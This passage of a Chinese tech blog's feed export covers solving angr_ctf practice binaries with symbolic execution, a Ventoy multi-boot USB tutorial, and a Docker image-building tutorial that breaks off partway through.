class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Run</span>():<br>    bin_path = <span class="hljs-string">&quot;./05_angr_symbolic_memory&quot;</span><br>    project = angr.Project(bin_path, auto_load_libs=<span class="hljs-literal">False</span>)<br>    <br>    <span class="hljs-comment"># 设置起始状态</span><br>    start_address =<span class="hljs-number">0x08048601</span><br>    initial_state = project.factory.blank_state(addr=start_address)<br>    <br>    passwd_size_in_bits = <span class="hljs-number">64</span><br>    passwd0 = claripy.BVS(<span class="hljs-string">&#x27;passwd0&#x27;</span>, passwd_size_in_bits)<br>    passwd1 = claripy.BVS(<span class="hljs-string">&#x27;passwd1&#x27;</span>, passwd_size_in_bits)<br>    passwd2 = claripy.BVS(<span class="hljs-string">&#x27;passwd2&#x27;</span>, passwd_size_in_bits)<br>    passwd3 = claripy.BVS(<span class="hljs-string">&#x27;passwd3&#x27;</span>, passwd_size_in_bits)<br><br>    passwd0_address = <span class="hljs-number">0x0A1BA1C0</span><br>    <br>    initial_state.memory.store(passwd0_address,passwd0)<br>    initial_state.memory.store(passwd0_address + <span class="hljs-number">0x8</span>, passwd1)<br>    initial_state.memory.store(passwd0_address + <span class="hljs-number">0x10</span>, passwd2)<br>    initial_state.memory.store(passwd0_address + <span class="hljs-number">0x18</span>, passwd3)<br><br>    simulation = project.factory.simgr(initial_state)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    simulation.explore(find=is_successful, avoid=should_abort)<br>    <br>    <span class="hljs-keyword">if</span> simulation.found:<br>        <span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> simulation.found:<br>            solution0 = state.solver.<span class="hljs-built_in">eval</span>(passwd0,cast_to=<span class="hljs-built_in">bytes</span>) <br>            solution1 = state.solver.<span class="hljs-built_in">eval</span>(passwd1, cast_to=<span class="hljs-built_in">bytes</span>)<br>            solution2 = state.solver.<span class="hljs-built_in">eval</span>(passwd2, cast_to=<span class="hljs-built_in">bytes</span>)<br>            solution3 = state.solver.<span class="hljs-built_in">eval</span>(passwd3, cast_to=<span class="hljs-built_in">bytes</span>)<br>            solution = solution0 + <span class="hljs-string">b&quot; &quot;</span> + solution1 + <span class="hljs-string">b&quot; &quot;</span> + solution2 + <span class="hljs-string">b&quot; &quot;</span> + solution3<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Run()<br></code></pre></td></tr></table></figure><ul><li><p><code>initial_state.memory.store</code></p><p>这里用到的访问方式是<code>state.memory.store</code>和<code>state.memory.load</code>，可以用来访问一段连续的内存。由于4个变量是连续存储，直接按8字节叠加即可。</p><ul><li><code>load(addr,...)</code>: 读取指定地址的内存</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def load(self, addr, <span class="hljs-attribute">size</span>=None, <span class="hljs-attribute">condition</span>=None, <span class="hljs-attribute">fallback</span>=None, <span class="hljs-attribute">add_constraints</span>=None, <span class="hljs-attribute">action</span>=None,       <span class="hljs-attribute">endness</span>=None, <span class="hljs-attribute">inspect</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">disable_actions</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">ret_on_segv</span>=<span class="hljs-literal">False</span>):<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">    Loads size bytes from dst.</span><br><span class="hljs-string">        :param addr:             The address to load from. </span><br><span class="hljs-string">        :param size:            The size (in bytes) of the load. </span><br><span class="hljs-string">        :param condition:       A claripy expression representing a condition for a conditional load.</span><br><span class="hljs-string">        :param fallback:        A fallback value if the condition ends up being False. </span><br><span class="hljs-string">        :param add_constraints: Add constraints resulting from the merge (default: True).</span><br><span class="hljs-string">        :param action:          A SimActionData to fill out with the constraints.</span><br><span class="hljs-string">        :param endness:         The endness to load with. </span><br><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>store(addr, ...)</code>: 向指定内存写入数据</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def store(self, addr, data, <span class="hljs-attribute">size</span>=None, <span class="hljs-attribute">condition</span>=None, <span class="hljs-attribute">add_constraints</span>=None, <span class="hljs-attribute">endness</span>=None, <span class="hljs-attribute">action</span>=None,<br>              <span class="hljs-attribute">inspect</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">priv</span>=None, <span class="hljs-attribute">disable_actions</span>=<span class="hljs-literal">False</span>):<br>        <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">        Stores content into memory.</span><br><span class="hljs-string">        :param addr:        A claripy expression representing the address to store at. </span><br><span class="hljs-string">        :param data:        The data to store (claripy expression or something convertable to a claripy expression).</span><br><span class="hljs-string">        :param size:        A claripy expression representing the size of the data to store. #大小</span><br><span class="hljs-string">        ...</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="0x04-传入的参数存放在堆上"><a href="#0x04-传入的参数存放在堆上" class="headerlink" title="0x04 传入的参数存放在堆上"></a>0x04 传入的参数存放在堆上</h2><p>题目：<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master/06_angr_symbolic_dynamic_memory">06_angr_symbolic_dynamic_memory</a></p><p><img src="https://img-blog.csdnimg.cn/384cc0505125470e801f3c97627018d0.png" alt="image-20230315203341304"></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs pf">import angr<br>import sys<br><br>import claripy<br><br><br>def Run():<br>    bin_path = <span class="hljs-string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span><br>    project = angr.Project(bin_path, auto_load_libs=False)<br>    <span class="hljs-comment"># initial_state = project.factory.entry_state()</span><br>    start_address = <span class="hljs-number">0</span>x08048699<br>    initial_state = project.factory.blank_state(addr=start_address)<br><br>    passwd_size_in_bits = <span class="hljs-number">64</span><br>    passwd0 = claripy.BVS(&#x27;passwd0&#x27;, passwd_size_in_bits)<br>    passwd1 = claripy.BVS(&#x27;passwd1&#x27;, passwd_size_in_bits)<br><br>    fake_heap_address0 = <span class="hljs-number">0</span>xffffc900<br>    pointer_to_malloc_memory_address0 = <span class="hljs-number">0</span>xabcc8a4<br>    fake_heap_address1 = <span class="hljs-number">0</span>xffffc955<br>    pointer_to_malloc_memory_address1 = <span class="hljs-number">0</span>xabcc8ac<br><br>    initial_state.memory.store(fake_heap_address0, passwd0)<br>    initial_state.memory.store(fake_heap_address1, passwd1)<br><br>    initial_state.memory.store(pointer_to_malloc_memory_address0,<br>                               fake_heap_address0, endness=project.arch.memory_endness)<br>    initial_state.memory.store(pointer_to_malloc_memory_address1,<br>                               fake_heap_address1, endness=project.arch.memory_endness)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    def is_successful(<span class="hljs-keyword">state</span>):<br>        stdout_output = <span class="hljs-keyword">state</span>.posix.dumps(sys.stdout.fileno())<br>        if b&#x27;Good Job.&#x27; <span class="hljs-keyword">in</span> stdout_output:<br>            return True<br>        else:<br>            return False<br><br>    def should_abort(<span class="hljs-keyword">state</span>):<br>        stdout_output = <span class="hljs-keyword">state</span>.posix.dumps(sys.stdout.fileno())<br>        if b&#x27;Try again.&#x27; <span class="hljs-keyword">in</span> stdout_output:<br>            return True<br>        else:<br>            return False<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    if simulation.found:<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">state</span> <span class="hljs-keyword">in</span> simulation.found:<br>            solution0 = <span class="hljs-keyword">state</span>.solver.eval(passwd0, cast_to=bytes)<br>            solution1 = <span class="hljs-keyword">state</span>.solver.eval(passwd1, cast_to=bytes)<br>            solution = solution0+b<span class="hljs-string">&quot; &quot;</span>+solution1<br>            print(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.format(solution.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Run()<br></code></pre></td></tr></table></figure><ul><li><p><code>initial_state.memory.store(fake_heap_address1, passwd1)</code></p><p>由于我们跳过了程序初始阶段，<code>buffer0</code>和<code>buffer1</code>并未进行<code>malloc</code>，因此我们需要手动模拟分配空间<code>malloc</code>的操作。<code>initial_state.memory.store</code>能够在内存中写入数据，因此完全可以用来模拟<code>malloc</code>，直接将符号位向量写入内存空间。<code>buffer0</code>和<code>buffer1</code>存储的是申请到的堆内存地址，angr并没有真正“运行”二进制文件，它只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址。而需要使用者做的就是选择两个地址存放的堆区地址，<code>buffer0</code>和<code>buffer1</code>就是可选项。0xffffc900和0xffffc955随机伪造的地址。</p></li><li><p><code>initial_state.memory.store(pointer_to_malloc_memory_address0,fake_heap_address0, endness=project.arch.memory_endness)</code></p><p>  空间分配好之后，我们直接将空间地址写入<code>buffer0</code>和<code>buffer1</code>，这两个变量又是在<code>.bss</code>，因此需要进行内存写入。<code>.store</code>参数<code>endness</code> 用于设置端序，angr默认为大端序，总共可选的值如下：</p><ul><li><code>LE</code> – 小端序</li><li><code>BE</code> – 大端序</li><li><code>ME</code> – 中间序</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天简单练习了<code>angr_ctf</code>的前六道题，感觉<code>angr</code>比我想象中的要强大，但是使用<code>angr</code>过程中也应该注意：<code>angr</code>实际上是一种路径探索的方法，在处理分支时，采取统统收集的策略，因此每当遇见一个分支，angr的路径数量就会乘2，这是一种指数增长，也就是所说的路径爆炸。执行上很像<code>BFS</code>，一旦分支过多，<code>angr</code>就无法较为快速的求解了，因此在使用过程中应该尽可能对源程序进行处理，最好能够减少分支路径。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://b0ldfrev.gitbook.io/note/symbolic_execution/angr-chu-tan#shen-me-shi-angr">angr初探</a></p><p><a href="https://b0ldfrev.gitbook.io/note/symbolic_execution/angr-jin-jie">angr_进阶</a></p><p><a href="https://www.cnblogs.com/lordtianqiyi/articles/16644860.html">angr_ctf</a></p><p><a href="https://github.com/anhkgg/angr-doc-zh_CN">angr-doc-zh_CN</a></p><p><a href="https://blog.csdn.net/qq_44370676/article/details/119741664">Angr入门（二）- 一些CTF的Angr分析</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>学习笔记</category>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超简单制作多系统启动U盘教程</title>
    <link href="/2023/01/22/Guide/%E8%B6%85%E7%AE%80%E5%8D%95%E5%88%B6%E4%BD%9C%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E4%BC%98%E7%9B%98%E6%95%99%E7%A8%8B/"/>
    <url>/2023/01/22/Guide/%E8%B6%85%E7%AE%80%E5%8D%95%E5%88%B6%E4%BD%9C%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E4%BC%98%E7%9B%98%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="超简单制作多系统启动U盘教程"><a href="#超简单制作多系统启动U盘教程" class="headerlink" title="超简单制作多系统启动U盘教程"></a>超简单制作多系统启动U盘教程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​这两天心血来潮，本来想用<code>Win to go</code>做一个windows便携系统，B站教程无意间发现<a href="https://www.ventoy.net/">Ventoy</a>软件，可谓功能强大特此记录一下。</p><p>​<code>Ventoy</code>简单理解就是一个操作系统引导器，通过使用该软件，我们可以将任意格式PE或操作系统直接运行安装，而不需要重新进行格式化写入U盘操作，只需要将<code>ISO</code>格式文件复制至U盘即可。这简直无敌，我只需要一个镜像包，就能跑任意PE系统，同时可以在U盘安装多个操作系统硬盘镜像，U盘系统也是简简单单，简直无敌~~~~</p><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>首先，需要先将<code>Ventoy</code>写入U盘，与大毛桃、U启动类似操作。</p><p><code>值得注意的是</code>，<code>Ventoy</code>最好是在安全启动状态开启的情况下安装，否则进入U盘系统时，可能需要重新配置<code>BIOS</code>；操作系统引导如果支持<code>UEFI</code>，建议分区类型选择GPT，MBR仅支持传统的<code>Legacy</code>模式；分区文件系统选择NTFS，比较通用一些。</p><p><img src="https://img-blog.csdnimg.cn/7eeaa006e2a64c67aaaabe167ff88057.png" alt="image-20230122163854425"></p><p><img src="https://img-blog.csdnimg.cn/896205f43e794208b7f652275b5eec58.png" alt="image-20230122165505968"></p><blockquote><p>  注：安装Ventoy需要格式化U盘数据，请知晓</p></blockquote><p>安装完成后，查看U盘分区，我们可以看到多了一个VTOYEF分区，这就是系统引导首先启动的地方。</p><p><img src="https://img-blog.csdnimg.cn/10b7fe443223415087cb3055d46cfc15.png" alt="image-20230122170423343"></p><p>之后可以启动<code>VentoyPlugson</code>对U盘系统进行进一步配置，包括操作系统镜像位置，启动语言等等</p><p><img src="https://img-blog.csdnimg.cn/7559eac0386e48a5811a5183d0244916.png" alt="image-20230122171110065"></p><p><img src="https://img-blog.csdnimg.cn/bcaf605634764c0b8e624272dd4e23dd.png" alt="image-20230122171232009"></p><h2 id="配置PE系统"><a href="#配置PE系统" class="headerlink" title="配置PE系统"></a>配置PE系统</h2><p>​对于PE系统来说，<code>ISO</code>文件足够启动，我们只需要将<code>ISO</code>格式镜像复制到<code>Ventoy</code>分区<code>IOS</code>目录即可，是不是非常简单呢，这里以微PE为例。</p><p>首先生成微PE的镜像文件，一般都会提供选项。</p><p><img src="https://img-blog.csdnimg.cn/403b8cde386740c9ad60b8e75d25eb92.png" alt="image-20230122173641851"></p><p>选择生成可执行ISO文件，复制到上一步配置的操作系统镜像位置目录，这里我配置的是<code>/ISO/PE</code>目录。</p><p>重启，选择U盘启动，由于设置了安全启动的缘故，可能会出现<code>Verification failed</code>报错，稍微配置一下就行。</p><p><img src="https://img-blog.csdnimg.cn/210927e84fd54c6685488864f86aa490.png" alt="img"></p><p>点击OK，下一级菜单选择<code>Enroll key from disk</code>或<code>Enroll hash from disk</code>，那个能用选哪个。</p><p><img src="https://img-blog.csdnimg.cn/d0cd1d487e0f4ba385da23988caefeee.png" alt="img"></p><p>这里选择<code>VTOYEFI</code>分区。</p><p><img src="https://img-blog.csdnimg.cn/153fe5b7427846958912192e8e8185b9.png" alt="img"></p><p>选择<code>KEY</code>。</p><p><img src="https://img-blog.csdnimg.cn/b62ca1fcf0714fdd9ee9c0eb469f6d9d.png" alt="img"></p><p>安装即可，重启进入U盘就能看到选择镜像的界面了。</p><p><img src="https://img-blog.csdnimg.cn/556c8c28bdcf48e997f9fa565f9e8930.png" alt="img"></p><p>正常模式直接进入PE系统，完美。</p><p><img src="https://img-blog.csdnimg.cn/5f72a10d39cd418ca6a51c93a9a3c772.png" alt="img"></p><h2 id="配置其他操作系统"><a href="#配置其他操作系统" class="headerlink" title="配置其他操作系统"></a>配置其他操作系统</h2><p>配置<code>windows</code>和Linux操作系统与配置PE系统类似，如果只是需要机器上安装Windows系统，只需要把Windows镜像复制<code>/ISO/</code>目录下即可，启动安装程序。如果需要使用<code>win to go</code>做U盘系统的话，则需要进行一些其他操作。</p><p><strong>需要的工具：</strong></p><p><a href="https://github.com/ventoy/vhdiso/releases">Ventoy启动VHD插件</a></p><p>WinNTSetup</p><p>首先  使用<code>WinNTSetup</code>选择<code>VHD</code>创建一块虚拟硬盘，实际上与安装虚拟机类似，只不过我们可以使用<code>Ventoy</code>直接引导虚拟磁盘，<code>Ventoy</code>是否能够直接引导虚拟机创建的虚拟磁盘还有待测试。</p><p><img src="https://img-blog.csdnimg.cn/1ac3363d9a864ae8b42d6af229b6982d.png" alt="image-20230123104454122"></p><p><img src="https://img-blog.csdnimg.cn/e697e5556a8f40c6b3ba5f6185133c0b.png" alt="image-20230123104510559"></p><p>最终配置如图，安装时记得选择不更新引导代码。</p><p><img src="https://img-blog.csdnimg.cn/7f2631b210dd4ef68e89f5274a08231f.png" alt="image-20230123165025826"></p><p><img src="https://img-blog.csdnimg.cn/7bd294f7b92840a78072fa175273e9dc.png" alt="image-20230123165050737"></p><p>重启后选择新添加的引导项，开机安装完成即可，可以在物理机引导中找到引导选项，安装完成后，使用<code>WinNTsetup</code>自带的BCD编辑删除即可。</p><p><img src="https://img-blog.csdnimg.cn/9502839dd28d4c9d90f96fc7b1d3101d.png" alt="image-20230123171403425"></p><p>该方式的主要原理就是使用本机自带的引导初始化U盘系统，之后删除本机引导就可以从Ventoy进行启动了，Linux方法类似这里不介绍了。</p><p>完</p>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>52折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>Ventoy启动盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker构建教程</title>
    <link href="/2022/12/18/Guide/Docker%E6%9E%84%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <url>/2022/12/18/Guide/Docker%E6%9E%84%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>Docker运行所依赖的文件系统。对于Liunx而言，内核启动后会挂在<code>root</code>文件系统，而Docker镜像就相当于一个<code>root</code>文件系统，每个容器依赖的镜像不同，其内的文件系统也有所有不同。与传统镜像不同的是，Docker镜像除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些<strong>配置参数</strong>（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建后也不会被改变。此外，Docker镜像在构成上与普通镜像也有所不同，Docker镜像充分利用Union FS技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 <code>ISO</code> 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。这就是docker的分层结构。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>​容器可以理解为Docker镜像的运行状态，镜像是静态的定义，容器是镜像运行的实体。容器的实质是进程，但与普通进程不同的是：容器进程运行于属于自己的独立的 <a href="https://en.wikipedia.org/wiki/Linux_namespaces">命名空间</a>。因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。</p><p>​容器跟Docker镜像一样都是采用的分层存储，每一个容器运行时，会以Docker镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为 <strong>容器存储层</strong>。容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。所有的文件写入操作，都应该使用 <a href>数据卷（Volume）</a>、或者 <a href>绑定宿主目录</a>，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。</p><h2 id="Dockerfile定制镜像"><a href="#Dockerfile定制镜像" class="headerlink" title="Dockerfile定制镜像"></a>Dockerfile定制镜像</h2><p>虽然我们可以使用<code>docker commit</code>保存某个容器的存储层为镜像，但是上一层的镜像修改无法被下一层所读取，这就导致后期维护的困难，因为始终不知道上一层究竟做了什么操作，因此，我们可以把每一层的修改命令都写入一个脚本，用这个脚本来构建、定制镜像，上述问题就迎刃而解了。这个脚本就是<code>Dockerfile</code></p><h3 id="Dockerfile脚本运行示例"><a href="#Dockerfile脚本运行示例" class="headerlink" title="Dockerfile脚本运行示例"></a>Dockerfile脚本运行示例</h3><p><code>Dockerfile </code>是一个文本文件，其内包含了一条条的 **指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><p>这里以构建一个简单的网页为例：</p><ul><li>创建<code>Dockerfile</code>文件；</li></ul><p>首先，在一个空白目录中，<strong>注意一定要是空目录，具体原因后面会介绍</strong>创建一个文本文件，并命名为<code>Dockerfile</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> mynginx<br><span class="hljs-built_in">cd</span> mynginx<br><span class="hljs-built_in">touch</span> Dockerfile<br></code></pre></td></tr></table></figure><p>其内容为：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> httpd<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello,World!!&lt;/h1&gt;&#x27;</span> &gt; /usr/local/apache2/htdocs/index.html</span><br></code></pre></td></tr></table></figure><ul><li>构建镜像</li></ul><p>这里我们使用了<code>docker build</code>命令进行镜像构建，命令格式：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">docker <span class="hljs-keyword">build</span> &lt;<span class="hljs-keyword">option</span>&gt; &lt;<span class="hljs-keyword">path</span>/URL&gt;<br></code></pre></td></tr></table></figure><p>在<code>Dockerfile</code>文件所在目录执行：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">docker build -<span class="hljs-built_in">t</span> myapac<span class="hljs-symbol">he:v1</span> .<br>-<span class="hljs-built_in">t</span> 指定镜像名称<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5b2f8cf8aecd4de3ae5f1473641e2a16.png" alt="image-20221219193447395"></p><p>可以看到，这里命令中使用的路径是<code>.</code>。<code>.</code>的意思并不是指的<code>Dockerfile</code>的文件位置，而是Docker上下文。在<code>Dockerfile</code>的编写过程中，我们经常会使用<code>COPY</code>、<code>add</code>指令包含外部文件，那么Docker引擎如何获得这些外部文件呢？就是通过Docker上下文。在Docker构建开始，Docker引擎会将所有Docker上下文内容复制到引擎中，这样我们在构架的时候也就可以直接使用<code>CPOY</code>和<code>ADD</code>命令了，如果Docker上下文文件夹内有很多内容，势必会导致Docker引擎复制太多东西，严重影响效率，这也就是我们需要在空白目录操作的原因。</p><ul><li>启动容器</li></ul><p>经过前两步我们已经成功构建镜像，现在我们启动个容器试一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker run -dit <span class="hljs-attr">--rm</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8080</span>:<span class="hljs-number">80</span> <span class="hljs-attr">--name</span> running-apache myapache:v1<br></code></pre></td></tr></table></figure><p>成功运行。</p><p><img src="https://img-blog.csdnimg.cn/acad39c2a3724e7db658aefb5ca8ec1d.png" alt="image-20221219194220286"></p><h3 id="Dockerfile指令集"><a href="#Dockerfile指令集" class="headerlink" title="Dockerfile指令集"></a><code>Dockerfile</code>指令集</h3><p><code>dockerfile</code>主要组成部分：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">基础镜像信息 <span class="hljs-keyword">FROM</span> centos:<span class="hljs-number">6.8</span><br>制作镜像操作指令<span class="hljs-keyword">RUN</span><span class="language-bash"> yum install openssh-server \ -y</span><br>容器启动时执行指令 <span class="hljs-keyword">CMD</span><span class="language-bash"> \[<span class="hljs-string">&quot;/bin/bash&quot;</span>\]</span><br></code></pre></td></tr></table></figure><p><code>dockerfile</code>常用指令：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> 这个镜像的妈妈是谁？（指定基础镜像）<br> <span class="hljs-keyword">MAINTAINER</span> 告诉别人，谁负责养它？（指定维护者信息，可以没有）<br> <span class="hljs-keyword">RUN</span><span class="language-bash"> 你想让它干啥（在命令前面加上RUN即可）</span><br> <span class="hljs-keyword">ADD</span><span class="language-bash"> 给它点创业资金（COPY文件，会自动解压）</span><br> <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> 我是<span class="hljs-built_in">cd</span>,今天刚化了妆（设置当前工作目录）</span><br> <span class="hljs-keyword">VOLUME</span><span class="language-bash"> 给它一个存放行李的地方（设置卷，挂载主机目录）</span><br> <span class="hljs-keyword">EXPOSE</span> 它要打开的门是啥（指定对外的端口）<br> <span class="hljs-keyword">CMD</span><span class="language-bash"> 奔跑吧，兄弟！（指定容器启动后的要干的事情）</span><br></code></pre></td></tr></table></figure><p><code>dockerfile</code>其他命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> 复制文件</span><br><span class="hljs-keyword">ENV</span>  环境变量<br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash">  容器启动后执行的命令</span><br></code></pre></td></tr></table></figure><h4 id="COPY-文件复制指令"><a href="#COPY-文件复制指令" class="headerlink" title="COPY 文件复制指令"></a>COPY 文件复制指令</h4><p>格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">COPY [--chown=<span class="hljs-tag">&lt;<span 